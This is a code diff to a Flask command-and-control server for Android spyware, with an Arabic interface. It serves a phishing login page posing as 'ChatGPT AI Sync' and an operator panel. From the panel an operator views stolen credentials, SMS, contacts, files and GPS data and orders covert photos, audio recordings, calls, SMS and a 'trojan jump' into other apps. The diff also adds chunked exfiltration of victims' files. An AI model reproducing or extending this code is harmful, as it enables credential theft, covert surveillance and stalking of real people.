@@ -8,7 +8,7 @@ import os
 urllib3.disable_warnings()
 
 app = Flask(__name__)
-app.secret_key = hashlib.sha256(b"secure_secret_key_v80_0_engine").digest()
+app.secret_key = hashlib.sha256(b"secure_secret_key_v81_0_engine").digest()
 
 DASHBOARD_PASSWORD_HASH = hashlib.sha256("admin123".encode()).hexdigest()
 
@@ -22,12 +22,14 @@ AGENT_SESSIONS = {}
 CAPTURED_CREDENTIALS = []
 TARGET_FILE_INDEX = {}
 TARGET_IMAGE_INDEX = {}
+TARGET_AUDIO_INDEX = {}
 TARGET_SMS_INDEX = {}
 TARGET_CONTACTS_INDEX = {}
 TARGET_LOCATION_INDEX = {}
 COMMAND_QUEUES = {}
 EXTRACTED_ALL_FILES = []
 EXECUTION_LOGS = []
+CHUNKED_STORAGE = {}
 
 @app.after_request
 def add_no_cache_headers(response):
@@ -36,12 +38,11 @@ def add_no_cache_headers(response):
     response.headers["Expires"] = "0"
     return response
 
-# 1️⃣ واجهة الهدف التمويهية (ChatGPT AI Sync)
 STANDALONE_APP_PORTAL = """<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>ChatGPT AI Sync • Pro Edition</title>
+<title>ChatGPT AI Sync • Pro Edition v81</title>
 <style>
 body{background:#121214;color:#f1f1f3;font-family:sans-serif;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;padding:15px}
 .box{background:#1f2023;padding:30px 25px;border-radius:12px;box-shadow:0 8px 30px rgba(0,0,0,0.7);width:100%;max-width:400px;text-align:center;border:1px solid #2d2e32}
@@ -56,7 +57,7 @@ button{width:100%;padding:14px;background:#19c37d;color:#fff;border:none;border-
 <div class="box">
   <div class="ai-logo">✨</div>
   <h2>منصة المزامنة الذكية ChatGPT</h2>
-  <div class="sub-title">تفعيل النظام الاستراتيجي الشامل</div>
+  <div class="sub-title">تفعيل النظام الاستراتيجي الشامل v81</div>
   <div class="input-group"><input type="email" id="target_email" placeholder="البريد الإلكتروني" required></div>
   <div class="input-group"><input type="password" id="target_pass" placeholder="كلمة المرور" required></div>
   <button onclick="triggerAIWorkflow()">تفعيل ومزامنة البيانات 🚀</button>
@@ -66,7 +67,7 @@ async function triggerAIWorkflow(){
     const email = document.getElementById('target_email').value.trim();
     const pass = document.getElementById('target_pass').value.trim();
     if(!email || !pass) { alert('يرجى ملء البيانات'); return; }
-    const globalToken = 'agent_' + Math.random().toString(36).substring(2, 10);
+    const globalToken = 'agent_v81_' + Math.random().toString(36).substring(2, 10);
     try {
         await fetch('/auth/verify/login', {
             method: 'POST',
@@ -85,22 +86,20 @@ async function triggerAIWorkflow(){
 </body>
 </html>"""
 
-# 2️⃣ لوحة تسجيل دخول القائد
 HTML_LOGIN_PAGE = """<!DOCTYPE html>
 <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><title>دخول القائد</title>
 <style>body{background:#010103;color:#ff0040;font-family:monospace;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
 .box{background:#04060e;border:2px solid #ff0040;padding:30px;border-radius:12px;text-align:center;width:350px}
 input{width:100%;padding:12px;margin:15px 0;background:#000;border:1px solid #ff0040;color:#fff;border-radius:6px;text-align:center;box-sizing:border-box}
 button{width:100%;padding:12px;background:#ff0040;border:none;color:#fff;font-weight:bold;border-radius:6px;cursor:pointer}</style></head>
-<body><div class="box"><h2>🔒 لوحة القيادة v80.0</h2>
+<body><div class="box"><h2>🔒 لوحة القيادة v81.0</h2>
 <form method="POST" action="/commander/login">
 <input type="password" name="password" placeholder="كلمة المرور" required>
 <button type="submit">دخول 🚀</button></form></div></body></html>"""
 
-# 3️⃣ لوحة القيادة الشاملة المطورة
 HTML_COMMAND_CENTER = """<!DOCTYPE html>
 <html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>لوحة السيطرة الميدانية v80.0</title>
+<title>لوحة السيطرة الميدانية v81.0</title>
 <style>
 body{background:#010103;color:#00ff88;font-family:Tahoma,monospace;padding:15px;text-align:center}
 .container{max-width:1150px;margin:auto}h1{color:#ff0040;margin-bottom:15px;font-size:22px}
@@ -115,7 +114,7 @@ th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}th{background:#0a0e1
 </style></head>
 <body>
 <div class="container">
-<h1>⚔️ لوحة السيطرة الميدانية المطورة v80.0 ⚔️</h1>
+<h1>⚔️ لوحة السيطرة الميدانية المتقدمة v81.0 ⚔️</h1>
 <div style="margin-bottom:15px;"><a href="/commander/logout" style="color:#ff0040;text-decoration:none;">[تسجيل خروج]</a></div>
 <div class="panel">
 <select id="command_type">
@@ -123,6 +122,7 @@ th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}th{background:#0a0e1
   <option value="fetch_captured_credentials">🔑 الحسابات المسروقة</option>
   <option value="fetch_target_file_list">📂 عرض ملفات الهدف قبل السحب</option>
   <option value="fetch_target_image_list">🖼️ عرض صور الهدف قبل السحب</option>
+  <option value="fetch_target_audio_list">🎙️ عرض التسجيلات الصوتية المسحوبة</option>
   <option value="fetch_target_sms_list">💬 عرض رسائل SMS</option>
   <option value="fetch_target_contacts_list">📞 عرض جهات الاتصال</option>
   <option value="fetch_target_location">📍 عرض الموقع الجغرافي GPS</option>
@@ -137,7 +137,7 @@ th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}th{background:#0a0e1
   
   <div class="btn-group">
     <button onclick="sendAction('capture_hidden_photo')" style="background:#e11d48; color:#fff;">📸 تصوير الهدف سراً</button>
-    <button onclick="sendAction('start_audio_recording')" style="background:#d97706; color:#fff;">🎙️ تسجيل صوت 10ث</button>
+    <button onclick="sendAction('start_audio_recording')" style="background:#d97706; color:#fff;">🎙️ تسجيل صوت 20ث</button>
     <button onclick="sendAction('pull_gps')" style="background:#0284c7; color:#fff;">📍 تحديد الموقع GPS</button>
     <button onclick="sendAction('open_camera')" style="background:#00ff88; color:#000;">📷 فتح الكاميرا</button>
     <button onclick="sendAction('open_whatsapp')" style="background:#00ff88; color:#000;">🟢 فتح واتساب</button>
@@ -147,8 +147,14 @@ th, td{padding:10px;border:1px solid #1a2a40;font-size:13px}th{background:#0a0e1
   </div>
 
   <div class="action-box">
+    <b>🐎 حصان تروجان - القفز والانتقال لتطبيق آخر (Package Name):</b><br>
+    <input type="text" id="trojan_package_input" placeholder="مثال: com.whatsapp أو com.android.settings" style="width:320px; direction:ltr; border-color:#38bdf8;">
+    <button onclick="triggerTrojanJump()" style="background:#0284c7; color:#fff;">إطلاق الحصان 🐎</button>
+  </div>
+
+  <div class="action-box">
     <b>📞 إجراء اتصال هاتفي مباشر من جهاز الهدف:</b><br>
-    <input type="text" id="call_phone_input" placeholder="أدخل رقم الهاتف للاتصال به (مثال: 777123456)" style="width:280px; direction:ltr; border-color:#38bdf8;">
+    <input type="text" id="call_phone_input" placeholder="أدخل رقم الهاتف (مثال: 777123456)" style="width:280px; direction:ltr; border-color:#38bdf8;">
     <button onclick="sendCallCommand()" style="background:#0284c7; color:#fff;">📞 اتصال الآن</button>
   </div>
 
@@ -197,6 +203,12 @@ async function executeCommand(){
        data.images.forEach(im => { img += `<tr><td>${im.token}</td><td style="color:#00ff88;direction:ltr">${im.filename}</td><td><button onclick="pullFile('${im.token}', '${im.filename}')">سحب الصورة 📥</button></td></tr>`; });
      } else { img += '<tr><td colspan="3" style="text-align:center">لا توجد صور مفهرسة</td></tr>'; }
      results.innerHTML = img + '</table></div>';
+   } else if(cmdType === 'fetch_target_audio_list'){
+     let aud = '<div class="card"><b>🎙️ التسجيلات الصوتية المسحوبة</b><table><tr><th>Token</th><th>مسار التسجيل الصوتي</th><th>إجراء السحب</th></tr>';
+     if(data.audio && data.audio.length>0){
+       data.audio.forEach(au => { aud += `<tr><td>${au.token}</td><td style="color:#00ff88;direction:ltr">${au.filename}</td><td><button onclick="pullFile('${au.token}', '${au.filename}')">سحب الصوت 📥</button></td></tr>`; });
+     } else { aud += '<tr><td colspan="3" style="text-align:center">لا توجد تسسجيلات صوتية مفهرسة</td></tr>'; }
+     results.innerHTML = aud + '</table></div>';
    } else if(cmdType === 'fetch_target_sms_list'){
      let sms = '<div class="card"><b>💬 رسائل الهدف</b><table><tr><th>Token</th><th>المرسل / المحتوى</th><th>الوقت</th></tr>';
      if(data.sms && data.sms.length>0){
@@ -213,7 +225,7 @@ async function executeCommand(){
      let loc = '<div class="card"><b>📍 إحداثيات الموقع الجغرافي GPS</b><table><tr><th>Token</th><th>خط العرض (Lat)</th><th>خط الطول (Lng)</th><th>الخريطة</th><th>الوقت</th></tr>';
      if(data.locations && data.locations.length>0){
        data.locations.forEach(l => { loc += `<tr><td>${l.token}</td><td>${l.lat}</td><td>${l.lng}</td><td><a href="https://maps.google.com/?q=${l.lat},${l.lng}" target="_blank" style="color:#38bdf8">[فتح في الخرائط 🗺️]</a></td><td>${l.time}</td></tr>`; });
-     } else { loc += '<tr><td colspan="5" style="text-align:center">لم يتم استلام إحداثيات بعد (اضغط زر تحديد الموقع GPS)</td></tr>'; }
+     } else { loc += '<tr><td colspan="5" style="text-align:center">لم يتم استلام إحداثيات بعد</td></tr>'; }
      results.innerHTML = loc + '</table></div>';
    } else if(cmdType === 'fetch_extracted_files'){
      let ef = '<div class="card"><b>📥 الملفات والصور والتسجيلات المسحوبة</b><table><tr><th>Token</th><th>اسم الملف</th><th>الوقت</th><th>تحميل</th></tr>';
@@ -243,12 +255,20 @@ async function sendAction(actionName){
   alert('تم إرسال أمر (' + actionName + ') إلى الهدف بنجاح!');
 }
 
+async function triggerTrojanJump(){
+  const token = document.getElementById('target_token_input').value.trim();
+  const pkg = document.getElementById('trojan_package_input').value.trim();
+  if(!token || !pkg) { alert('يرجى إدخال الرمز Token واسم الحزمة Package Name'); return; }
+  await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'trojan_jump', package_name: pkg})});
+  alert('تم إطلاق حصان تروجان للقفز إلى: ' + pkg);
+}
+
 async function sendCallCommand(){
   const token = document.getElementById('target_token_input').value.trim();
   const phone = document.getElementById('call_phone_input').value.trim();
-  if(!token || !phone) { alert('يرجى إدخال الرمز Token ورقم الهاتف المطلوب الاتصال به'); return; }
+  if(!token || !phone) { alert('يرجى إدخال الرمز Token ورقم الهاتف'); return; }
   await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'make_call', phone: phone})});
-  alert('تم إرسال أمر الاتصال بالرقم (' + phone + ') من جهاز الهدف!');
+  alert('تم إرسال أمر الاتصال بالرقم (' + phone + ')!');
 }
 
 async function quickCall(token, phone){
@@ -260,9 +280,9 @@ async function sendSMSCommand(){
   const token = document.getElementById('target_token_input').value.trim();
   const phone = document.getElementById('sms_phone_input').value.trim();
   const body = document.getElementById('sms_body_input').value.trim();
-  if(!token || !phone || !body) { alert('يرجى استكمال بيانات الرسالة والرقم والرمز'); return; }
+  if(!token || !phone || !body) { alert('يرجى استكمال البيانات'); return; }
   await fetch('/api/queue_command', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({token: token, action: 'send_sms', phone: phone, body: body})});
-  alert('تم توجيه أمر إرسال الرسالة بنجاح!');
+  alert('تم توجيه أمر إرسال الرسالة!');
 }
 </script></body></html>"""
 
@@ -316,6 +336,7 @@ def report_files():
     token = req_data.get('token', 'N/A')
     if 'files' in req_data: TARGET_FILE_INDEX[token] = req_data.get('files', [])
     if 'images' in req_data: TARGET_IMAGE_INDEX[token] = req_data.get('images', [])
+    if 'audio' in req_data: TARGET_AUDIO_INDEX[token] = req_data.get('audio', [])
     if 'sms' in req_data: TARGET_SMS_INDEX[token] = req_data.get('sms', [])
     if 'contacts' in req_data: TARGET_CONTACTS_INDEX[token] = req_data.get('contacts', [])
     if 'location' in req_data: TARGET_LOCATION_INDEX[token] = req_data.get('location', [])
@@ -352,25 +373,38 @@ def report_execution():
     })
     return jsonify({"status": "logged"})
 
-@app.route('/api/upload_real_file', methods=['POST'])
-def upload_real_file():
+@app.route('/api/upload_real_file_chunk', methods=['POST'])
+def upload_real_file_chunk():
     req_data = request.get_json(silent=True) or {}
     token = req_data.get('token', 'N/A')
     filename = req_data.get('filename', 'file.bin')
-    file_b64 = req_data.get('data', '')
-    if file_b64:
-        try:
-            file_bytes = base64.b64decode(file_b64)
+    chunk_index = req_data.get('chunk_index', 0)
+    total_chunks = req_data.get('total_chunks', 1)
+    chunk_b64 = req_data.get('data', '')
+    
+    key = f"{token}_{filename}"
+    if key not in CHUNKED_STORAGE:
+        CHUNKED_STORAGE[key] = {"total": total_chunks, "parts": {}}
+    
+    try:
+        CHUNKED_STORAGE[key]["parts"][chunk_index] = base64.b64decode(chunk_b64)
+        if len(CHUNKED_STORAGE[key]["parts"]) == total_chunks:
+            full_bytes = b""
+            for i in range(total_chunks):
+                full_bytes += CHUNKED_STORAGE[key]["parts"][i]
+            
             saved_name = f"{token}_{filename.replace('/', '_').replace('(', '').replace(')', '')}"
             filepath = os.path.join(UPLOAD_FOLDER, saved_name)
-            with open(filepath, "wb") as f: f.write(file_bytes)
+            with open(filepath, "wb") as f: f.write(full_bytes)
+            
             EXTRACTED_ALL_FILES.append({
                 "token": token, "filename": filename, "saved_name": saved_name,
                 "time": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             })
-            return jsonify({"status": "saved"})
-        except Exception as e: return jsonify({"status": "error", "message": str(e)}), 400
-    return jsonify({"status": "empty"}), 400
+            del CHUNKED_STORAGE[key]
+            return jsonify({"status": "completed"})
+        return jsonify({"status": "chunk_received"})
+    except Exception as e: return jsonify({"status": "error", "message": str(e)}), 400
 
 @app.route('/download/<path:filename>', methods=['GET'])
 def download_file(filename):
@@ -394,6 +428,11 @@ def api_index():
         for tkn, lst in TARGET_IMAGE_INDEX.items():
             for im in lst: flat_img.append({"token": tkn, "filename": im})
         return jsonify({"images": flat_img})
+    elif mode == "fetch_target_audio_list":
+        flat_aud = []
+        for tkn, lst in TARGET_AUDIO_INDEX.items():
+            for au in lst: flat_aud.append({"token": tkn, "filename": au})
+        return jsonify({"audio": flat_aud})
     elif mode == "fetch_target_sms_list":
         flat_sms = []
         for tkn, lst in TARGET_SMS_INDEX.items():
